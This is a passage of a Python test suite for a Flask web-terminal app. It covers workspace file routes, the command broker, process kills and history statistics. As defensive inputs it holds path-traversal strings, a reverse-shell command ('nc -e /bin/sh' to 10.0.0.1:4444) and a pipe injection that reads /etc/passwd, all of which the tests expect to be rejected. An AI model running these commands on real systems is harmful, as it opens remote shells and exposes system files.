            assert moved_to_root.status_code == 200
            assert moved_to_root.get_json()["moved"]["destination"] == "one.txt"

    def test_move_rejects_invalid_paths_and_recursive_folder_moves(self):
        client = get_client()
        session = "workspace-move-invalid-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/one.txt", "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/nested/two.txt", "text": "two\n"},
            )

            cases = [
                {"source": "../escape.txt", "destination": "reports"},
                {"source": "reports/one.txt", "destination": "../escape.txt"},
                {"source": "reports/one.txt", "destination": "reports/nested/two.txt"},
                {"source": "reports", "destination": "reports/nested"},
            ]
            for payload in cases:
                resp = client.post(
                    "/workspace/files/move",
                    headers={"X-Session-ID": session},
                    json=payload,
                )
                assert resp.status_code == 400

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            files = {item["path"] for item in listed.get_json()["files"]}
            assert files == {"reports/one.txt", "reports/nested/two.txt"}

    def test_rejects_unsafe_paths(self):
        client = get_client()
        session = "workspace-paths-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            for bad_path in ("../escape.txt", "/tmp/escape.txt", "a\\b.txt"):
                resp = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": session},
                    json={"path": bad_path, "text": "x"},
                )
                assert resp.status_code == 400
                directory = client.post(
                    "/workspace/directories",
                    headers={"X-Session-ID": session},
                    json={"path": bad_path},
                )
                assert directory.status_code == 400

    def test_rejects_unsafe_paths_on_read_delete_and_download(self):
        client = get_client()
        session = "workspace-route-paths-" + uuid.uuid4().hex[:8]
        bad_paths = ("../escape.txt", "/tmp/escape.txt", "a\\b.txt")
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            for bad_path in bad_paths:
                encoded = quote(bad_path, safe="")
                read = client.get(
                    f"/workspace/files/read?path={encoded}",
                    headers={"X-Session-ID": session},
                )
                deleted = client.delete(
                    f"/workspace/files?path={encoded}",
                    headers={"X-Session-ID": session},
                )
                downloaded = client.get(
                    f"/workspace/files/download?path={encoded}",
                    headers={"X-Session-ID": session},
                )

                assert read.status_code == 400
                assert deleted.status_code == 400
                assert downloaded.status_code == 400

    def test_allows_hidden_workspace_paths_when_listed(self):
        client = get_client()
        session = "workspace-hidden-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": ".config/amass.txt", "text": "hidden ok\n"},
            )
            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            read = client.get(
                "/workspace/files/read?path=.config%2Famass.txt",
                headers={"X-Session-ID": session},
            )

            assert created.status_code == 200
            assert listed.status_code == 200
            assert ".config/amass.txt" in {item["path"] for item in listed.get_json()["files"]}
            assert read.status_code == 200
            assert read.get_json()["text"] == "hidden ok\n"

    def test_enforces_quota_and_type_checks(self):
        client = get_client()
        session = "workspace-quota-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
            config.CFG,
            self._cfg(tmp, workspace_quota_mb=0, workspace_max_file_mb=0, workspace_max_files=1),
        ):
            non_object = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                data="not-json",
                content_type="text/plain",
            )
            assert non_object.status_code == 400

            non_text = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": ["darklab.sh"]},
            )
            assert non_text.status_code == 400
            assert json.loads(non_text.data)["error"] == "text must be a string"

            too_big = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "x"},
            )
            assert too_big.status_code == 413

    def test_download_streams_session_owned_file(self):
        client = get_client()
        session = "workspace-download-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "notes/targets.txt", "text": "darklab.sh\n"},
            )
            resp = client.get(
                "/workspace/files/download?path=notes/targets.txt",
                headers={"X-Session-ID": session},
            )
        assert resp.status_code == 200
        assert resp.get_data(as_text=True) == "darklab.sh\n"
        assert "attachment" in resp.headers["Content-Disposition"]
        assert "targets.txt" in resp.headers["Content-Disposition"]

    def test_file_list_includes_project_artifact_metadata(self):
        client = get_client()
        session = "workspace-artifacts-" + uuid.uuid4().hex[:8]
        run_id = "run-" + uuid.uuid4().hex[:8]
        project_id = "prj_" + uuid.uuid4().hex[:16]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/targets.txt", "text": "darklab.sh\n"},
            )
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'cat reports/targets.txt', ?)",
                    (run_id, session, datetime.now(timezone.utc).isoformat()),
                )
                conn.execute(
                    "INSERT INTO projects "
                    "(id, session_id, name, slug, description, status, color, created, updated) "
                    "VALUES (?, ?, 'Artifact Case', ?, '', 'active', '', datetime('now'), datetime('now'))",
                    (project_id, session, f"artifact-case-{uuid.uuid4().hex[:8]}"),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                    ("pln_" + uuid.uuid4().hex[:16], project_id, run_id),
                )
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                    "VALUES (?, ?, ?, 'reports/targets.txt', 'targets.txt', 'output', 11, 'workspace_flag', "
                    "datetime('now'))",
                    ("rfa_" + uuid.uuid4().hex[:16], session, run_id),
                )
                conn.commit()
            resp = client.get("/workspace/files", headers={"X-Session-ID": session})
        data = json.loads(resp.data)
        file_row = next(item for item in data["files"] if item["path"] == "reports/targets.txt")
        assert file_row["artifact_count"] == 1
        assert file_row["artifact_run_count"] == 1
        assert file_row["project_names"] == ["Artifact Case"]

    def test_periodic_cleanup_runs_before_requests_when_workspace_enabled(self):
        client = get_client()
        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
        try:
            shell_app._last_workspace_cleanup_monotonic = 0
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                from services.workspace.files import ensure_session_workspace
                expired_root = ensure_session_workspace("expired-session", config.CFG)
                os.utime(expired_root, (1000, 1000))

                with mock.patch("app.time.monotonic", return_value=1000):
                    resp = client.get("/health")

                assert resp.status_code == 200
                assert not expired_root.exists()
        finally:
            shell_app._last_workspace_cleanup_monotonic = previous_cleanup

    def test_periodic_cleanup_skips_request_session_workspace(self):
        client = get_client()
        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
        try:
            shell_app._last_workspace_cleanup_monotonic = 0
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                from services.workspace.files import ensure_session_workspace
                current_root = ensure_session_workspace("active-session", config.CFG)
                expired_root = ensure_session_workspace("expired-session", config.CFG)
                os.utime(current_root, (1000, 1000))
                os.utime(expired_root, (1000, 1000))

                with mock.patch("app.time.monotonic", return_value=1000):
                    resp = client.get("/health", headers={"X-Session-ID": "active-session"})

                assert resp.status_code == 200
                assert current_root.exists()
                assert not expired_root.exists()
        finally:
            shell_app._last_workspace_cleanup_monotonic = previous_cleanup


# ── /runs ─────────────────────────────────────────────────────────────────────

class TestRunRoute:
    def test_brokered_run_requires_available_broker(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=False), \
             mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
            resp = client.post("/runs", json={"command": "echo hi"})
        assert resp.status_code == 503
        assert json.loads(resp.data)["error"] == "broker unavailable"

    def test_brokered_run_missing_runtime_returns_synthetic_stream_reference(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
             mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic, \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post(
                "/runs",
                json={"command": "nmap -sV darklab.sh"},
                headers={"X-Session-ID": "session-1"},
            )
        assert resp.status_code == 202
        assert json.loads(resp.data) == {
            "run_id": "run-missing",
            "stream": "/runs/run-missing/stream",
        }
        synthetic.assert_called_once()
        args = synthetic.call_args.args
        assert args[0] == "nmap -sV darklab.sh"
        assert args[3] == [{"type": "output", "text": "Command is not installed on this instance: nmap"}]
        assert args[4] == 127
        assert synthetic.call_args.kwargs == {"cmd_type": "missing", "owner_tab_id": ""}
        popen.assert_not_called()

    def test_brokered_run_rejects_invalid_command_payloads(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True):
            non_object = client.post("/runs", json=["hostname"])
            missing = client.post("/runs", json={})
            non_string = client.post("/runs", json={"command": 42})
            blank = client.post("/runs", json={"command": "   "})

        assert non_object.status_code == 400
        assert json.loads(non_object.data) == {"error": "Request body must be a JSON object"}
        assert missing.status_code == 400
        assert json.loads(missing.data) == {"error": "No command provided"}
        assert non_string.status_code == 400
        assert json.loads(non_string.data) == {"error": "Command must be a string"}
        assert blank.status_code == 400
        assert json.loads(blank.data) == {"error": "No command provided"}

    def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post("/runs", json={"command": "nmap -sS 127.0.0.1"})

        assert resp.status_code == 403
        assert json.loads(resp.data) == {"error": "blocked"}
        popen.assert_not_called()

    def test_brokered_run_starts_real_process_and_registers_active_run(self):
        client = get_client()
        fake_proc = _RouteFakeProc(pid=8765)
        _CapturedThread.instances = []

        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("ping darklab.sh", "rewritten")), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
             mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
             mock.patch("blueprints.run.pid_register") as pid_register, \
             mock.patch("blueprints.run.active_run_register") as active_register, \
             mock.patch("blueprints.run.publish_run_event") as publish, \
             mock.patch("blueprints.run.threading", mock.Mock(Thread=_CapturedThread)), \
             mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"):
            resp = client.post(
                "/runs",
                json={"command": "ping darklab.sh", "tab_id": "tab-1"},
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 202
        assert json.loads(resp.data) == {
            "run_id": "run-real",
            "stream": "/runs/run-real/stream",
        }
        launched = popen.call_args.args[0]
        assert launched[-2:] == ["-c", "ping darklab.sh"]
        pid_register.assert_called_once_with("run-real", 8765)
        active_register.assert_called_once()
        assert active_register.call_args.args[:4] == (
            "run-real",
            8765,
            "session-1",
            "ping darklab.sh",
        )
        assert active_register.call_args.kwargs == {
            "owner_client_id": "client-1",
            "owner_tab_id": "tab-1",
        }
        publish.assert_called_once()
        assert publish.call_args.args[:2] == ("run-real", "started")
        assert publish.call_args.args[2]["run_id"] == "run-real"
        assert len(_CapturedThread.instances) == 1
        thread = _CapturedThread.instances[0]
        assert thread.started is True
        assert thread.daemon is True
        assert thread.name == "run-broker-run-real"
        assert thread.kwargs["run_id"] == "run-real"
        assert thread.kwargs["proc"] is fake_proc
        assert thread.kwargs["session_id"] == "session-1"
        assert thread.kwargs["original_command"] == "ping darklab.sh"
        assert thread.kwargs["rewrite_notice"] == "rewritten"

    def test_brokered_run_events_returns_session_scoped_backfill(self):
        client = get_client()
        fake_event = mock.Mock(event_id="10-0", payload={"type": "output", "text": "hello"})
        fake_event.as_payload.return_value = {"event_id": "10-0", "type": "output", "text": "hello"}
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events:
            resp = client.get(
                "/runs/run-1/events?after=9-0&limit=25",
                headers={"X-Session-ID": "session-1"},
            )
        assert resp.status_code == 200
        assert json.loads(resp.data) == {
            "run_id": "run-1",
            "events": [{"event_id": "10-0", "type": "output", "text": "hello"}],
        }
        get_events.assert_called_once_with("run-1", after_id="9-0", limit=25)

    def test_brokered_run_events_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
             mock.patch("blueprints.run.get_run_events") as get_events:
            resp = client.get(
                "/runs/run-other/events",
                headers={"X-Session-ID": "session-1"},
            )

        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "Run not found"}
        get_events.assert_not_called()

    def test_brokered_run_stream_replays_events_for_session_run(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])), \
             mock.patch("blueprints.run.active_run_touch_owner") as touch:
            resp = client.get(
                "/runs/run-1/stream?after=9-0&tab_id=tab-1",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )
            body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert body == "data: one\n\n"
        touch.assert_called_once_with("run-1", "client-1", "tab-1")

    def test_brokered_run_stream_allows_registered_run_that_exited_before_persistence(self):
        client = get_client()
        with mock.patch("blueprints.run.active_run_belongs_to_session", return_value=True), \
             mock.patch("blueprints.run.active_runs_for_session") as active_runs, \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: fast-exit\n\n"])):
            resp = client.get(
                "/runs/run-fast/stream",
                headers={"X-Session-ID": "session-1"},
            )
            body = resp.get_data(as_text=True)

        assert resp.status_code == 200
        assert body == "data: fast-exit\n\n"
        active_runs.assert_not_called()

    def test_brokered_run_stream_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
             mock.patch("blueprints.run.stream_run_events") as stream_events, \
             mock.patch("blueprints.run.log.warning") as warn:
            resp = client.get(
                "/runs/run-other/stream",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "Run not found"}
        stream_events.assert_not_called()
        warn.assert_called_once()
        assert warn.call_args.args[0] == "RUN_BROKER_STREAM_MISS"
        extra = warn.call_args.kwargs["extra"]
        assert extra["run_id"] == "run-other"
        assert extra["active_match"] is False
        assert extra["db_match"] is False

    def test_brokered_run_owner_takeover_route_is_retired(self):
        client = get_client()
        resp = client.post(
            "/runs/run-1/owner",
            headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
            json={"tab_id": "tab-2"},
        )
        assert resp.status_code == 404

    def test_kill_allows_same_session_attached_client_and_publishes_killer(self):
        client = get_client()
        with mock.patch("blueprints.run.pid_pop_for_session", return_value=4321) as pop_pid, \
             mock.patch("blueprints.run.publish_run_event") as publish, \
             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
             mock.patch("blueprints.run.os.killpg") as killpg:
            resp = client.post(
                "/kill",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-1", "tab_id": "tab-2"},
            )
        assert resp.status_code == 200
        assert json.loads(resp.data) == {"killed": True}
        pop_pid.assert_called_once_with("run-1", "session-1")
        publish.assert_called_once_with("run-1", "killed", {
            "killer_client_id": "client-2",
            "killer_tab_id": "tab-2",
        })
        killpg.assert_called_once_with(4321, shell_app.signal.SIGTERM)

    def test_kill_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.pid_pop_for_session", return_value=None) as pop_pid, \
             mock.patch("blueprints.run.publish_run_event") as publish:
            resp = client.post(
                "/kill",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-1"},
            )
        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "No such process"}
        pop_pid.assert_called_once_with("run-1", "session-1")
        publish.assert_not_called()

    def test_disallowed_command_returns_403(self):
        client = get_client()
        # Patch in commands' namespace — is_command_allowed calls load_command_policy
        # from commands' own namespace, not from app's.
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
            resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
        assert resp.status_code == 403

    def test_shell_operator_returns_403(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
            resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
        assert resp.status_code == 403

    def test_non_json_body_handled(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True):
            resp = client.post("/runs", data="not json", content_type="text/plain")
        # Should not crash — Flask returns 400 or 415 for bad content type
        assert resp.status_code in (400, 415, 500)

    def test_client_side_run_persists_terminal_native_builtin(self):
        client = get_client()
        session = "client-run-" + uuid.uuid4().hex[:8]
        try:
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "theme list",
                    "exit_code": 0,
                    "lines": [
                        {"text": "Available themes:", "cls": "builtin-section"},
                        {"text": "Dark themes:", "cls": "builtin-section"},
                    ],
                },
            )
            data = json.loads(resp.data)
            assert resp.status_code == 200
            assert data["ok"] is True
            assert data["output_line_count"] == 2

            history = json.loads(
                client.get(
                    "/history?type=runs&include_total=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert history["runs"][0]["command"] == "theme list"
            assert history["runs"][0]["run_kind"] == "builtin"
            assert history["total_count"] == 1

            run_id = history["runs"][0]["id"]
            detail = json.loads(
                client.get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert detail["command"] == "theme list"
            assert detail["output"] == ["Available themes:", "Dark themes:"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_can_offload_search_text_and_delete_it_with_run(self):
        from services.storage import body_store

        client = get_client()
        session = "client-run-offload-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(body_store, "DATA_DIR", tmp), \
             mock.patch.dict("config.CFG", {"runs_search_text_inline_max_bytes": 1}):
            offloaded_line = "Available themes: " + ("x" * 4100) + " needle-after-pointer-preview"
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "theme list",
                    "exit_code": 0,
                    "lines": [{"text": offloaded_line, "cls": "builtin-section"}],
                },
            )
            run_id = json.loads(resp.data)["run_id"]
            with db_connect() as conn:
                stored = conn.execute(
                    "SELECT output_search_text FROM runs WHERE id = ?",
                    (run_id,),
                ).fetchone()["output_search_text"]
            pointer = body_store.stored_body_pointer(stored)
            assert pointer is not None
            body_path = os.path.join(tmp, pointer["rel_path"])
            assert os.path.exists(body_path)

            detail = json.loads(
                client.get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            search_resp = client.get(
                "/history?q=needle-after-pointer-preview&scope=all&include_total=1",
                headers={"X-Session-ID": session},
            )
            search_data = json.loads(search_resp.data)
            delete_resp = client.delete(f"/history/{run_id}", headers={"X-Session-ID": session})

            assert resp.status_code == 200
            assert detail["output"] == [offloaded_line]
            assert search_resp.status_code == 200
            assert search_data["total_count"] == 1
            assert search_data["runs"][0]["id"] == run_id
            assert delete_resp.status_code == 200
            assert not os.path.exists(body_path)

    def test_client_side_run_persists_tour_builtin(self):
        client = get_client()
        session = "client-tour-" + uuid.uuid4().hex[:8]
        try:
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "tour",
                    "exit_code": 0,
                    "lines": [
                        {"text": "Running commands", "cls": "builtin-section"},
                        {"text": "dig darklab.sh A", "cls": "builtin-help-row"},
                    ],
                },
            )
            data = json.loads(resp.data)
            assert resp.status_code == 200
            assert data["ok"] is True

            history = json.loads(
                client.get(
                    "/history?type=runs&include_total=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert history["runs"][0]["command"] == "tour"
            assert history["total_count"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_does_not_link_to_active_project(self):
        client = get_client()
        session = "client-run-project-" + uuid.uuid4().hex[:8]
        project_resp = client.post(
            "/projects",
            headers={"X-Session-ID": session},
            json={"name": "Client Project"},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            "/projects/active",
            headers={"X-Session-ID": session},
            json={"project_id": project["id"]},
        )

        resp = client.post(
            "/run/client",
            headers={"X-Session-ID": session},
            json={
                "command": "theme current",
                "exit_code": 0,
                "lines": [{"text": "Current theme: darklab", "cls": "builtin-section"}],
            },
        )
        assert resp.status_code == 200

        conn = sqlite3.connect(DB_PATH)
        try:
            row = conn.execute(
                "SELECT l.entity_type, l.source, r.command "
                "FROM project_links l JOIN runs r ON r.id = l.entity_id "
                "WHERE l.project_id = ?",
                (project["id"],),
            ).fetchone()
        finally:
            conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()
        assert row is None

    def test_client_side_run_rejects_non_client_builtin_root(self):
        client = get_client()
        resp = client.post(
            "/run/client",
            json={
                "command": "ping darklab.sh",
                "exit_code": 0,
                "lines": [],
            },
        )
        assert resp.status_code == 403


# ── /history ──────────────────────────────────────────────────────────────────

class TestHistoryRoute:
    def test_get_returns_200(self):
        client = get_client()
        resp = client.get("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200

    def test_get_returns_runs_list(self):
        client = get_client()
        data = json.loads(
            client.get("/history", headers={"X-Session-ID": "test-session"}).data
        )
        assert "items" in data
        assert isinstance(data["items"], list)
        assert "runs" in data
        assert isinstance(data["runs"], list)
        assert "roots" in data
        assert isinstance(data["roots"], list)

    def test_stats_returns_compact_session_counters(self):
        client = get_client()
        session = "history-stats-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-ok", f"{session}-fail", f"{session}-terminated", f"{session}-active"]
        snapshot_id = f"{session}-snapshot"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sT ip.darklab.sh", "2026-01-01T00:00:00",
                 "2026-01-01T00:00:10", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "curl https://ip.darklab.sh", "2026-01-01T00:01:00",
                 "2026-01-01T00:01:20", 1, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "ping ip.darklab.sh", "2026-01-01T00:02:00",
                 "2026-01-01T00:02:15", -15, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[3], session, "sleep 60", "2026-01-01T00:03:00", None, None, "[]"),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                (snapshot_id, session, "snap", "2026-01-01T00:03:00", "[]"),
            )
            conn.execute(
                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                (session, "nmap -sT ip.darklab.sh"),
            )
            conn.commit()
            data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)
            assert data["runs"]["total"] == 4
            assert data["runs"]["succeeded"] == 1
            assert data["runs"]["failed"] == 1
            assert data["runs"]["incomplete"] == 1
            assert abs(data["runs"]["average_elapsed_seconds"] - 15.0) < 0.01
            assert data["snapshots"] == 1
            assert data["starred_commands"] == 1
            assert isinstance(data["active_runs"], int)
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id IN (?, ?, ?, ?)", run_ids)
                conn.execute("DELETE FROM snapshots WHERE id = ?", (snapshot_id,))
                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
                conn.commit()

    def test_stats_tolerates_missing_optional_counter_tables(self):
        client = get_client()
        session = "history-stats-missing-tables-" + uuid.uuid4().hex[:8]
        run_id = f"{session}-ok"
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (
                        run_id,
                        session,
                        "nmap -sT ip.darklab.sh",
                        "2026-01-01T00:00:00",
                        "2026-01-01T00:00:10",
                        0,
                        "[]",
                    ),
                )
                conn.execute(
                    "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                    (f"{session}-snapshot", session, "snap", "2026-01-01T00:00:00", "[]"),
                )
                conn.execute(
                    "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                    (session, "nmap -sT ip.darklab.sh"),
                )
                conn.commit()

            with mock.patch("blueprints.history._history_table_exists", return_value=False):
                data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)

            assert data["runs"]["total"] == 1
            assert data["runs"]["succeeded"] == 1
            assert data["snapshots"] == 0
            assert data["starred_commands"] == 0
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
                conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
                conn.commit()

    def test_insights_empty_session_and_explicit_day_clamps(self):
        client = get_client()
        session = "history-insights-empty-" + uuid.uuid4().hex[:8]

        auto = json.loads(client.get("/history/insights?days=auto", headers={"X-Session-ID": session}).data)
        assert auto["days"] == 28
        assert len(auto["activity"]) == 28
        assert auto["first_run_date"] is None
        assert auto["command_mix"] == []
        assert auto["constellation"] == []
        assert auto["events"] == []
        assert auto["windows"]["activity"]["total_runs"] == 0
        assert auto["windows"]["command_mix"]["days"] == 90
        assert auto["windows"]["command_mix"]["sparse"] is True
        assert auto["windows"]["constellation"]["days"] == 90
        assert auto["windows"]["constellation"]["sparse"] is True

        long_window = json.loads(client.get("/history/insights?days=999", headers={"X-Session-ID": session}).data)
        assert long_window["days"] == 365
        assert len(long_window["activity"]) == 365
        assert long_window["windows"]["activity"]["days"] == 365

    def test_insights_returns_visual_history_payloads(self):
        client = get_client()
        session = "history-insights-" + uuid.uuid4().hex[:8]
        run_ids = [
            f"{session}-nmap",
            f"{session}-curl",
            f"{session}-terminated",
            f"{session}-sleep",
            f"{session}-old",
        ]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        day_sixty = (now - timedelta(days=60)).isoformat()
        day_ten = (now - timedelta(days=10)).isoformat()
        day_one = (now - timedelta(days=1)).isoformat()
        today = now.isoformat()
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[4], session, "whois old.darklab.sh", day_sixty,
                 (now - timedelta(days=60, seconds=-2)).isoformat(), 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sT ip.darklab.sh", day_ten,
                 (now - timedelta(days=10, seconds=-10)).isoformat(), 0, "[]", 12),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "curl https://ip.darklab.sh", day_one,
                 (now - timedelta(days=1, seconds=-5)).isoformat(), 1, "[]", 4),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "ping ip.darklab.sh", day_one,
                 (now - timedelta(days=1, seconds=-15)).isoformat(), -15, "[]", 2),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[3], session, "sleep 60", today, None, None, "[]", 0),
            )
            conn.commit()
            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
            assert data["days"] == 61
            assert len(data["activity"]) == 61
            assert data["start_date"] == (now - timedelta(days=60)).date().isoformat()
